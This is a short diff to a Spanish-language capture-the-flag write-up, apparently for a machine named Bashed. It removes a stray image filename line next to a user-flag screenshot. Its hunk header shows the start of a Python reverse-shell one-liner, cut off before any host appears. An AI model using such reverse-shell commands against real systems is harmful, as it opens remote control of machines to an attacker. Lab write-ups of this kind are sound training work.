@@ -116,7 +116,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 Ahora podremos agarrar la flag de user.txt
 
-falguser.jpg
+
 ![falguser.jpg]({{site.baseurl}}/images/Bashed/falguser.jpg)
 # PostExplotación
 
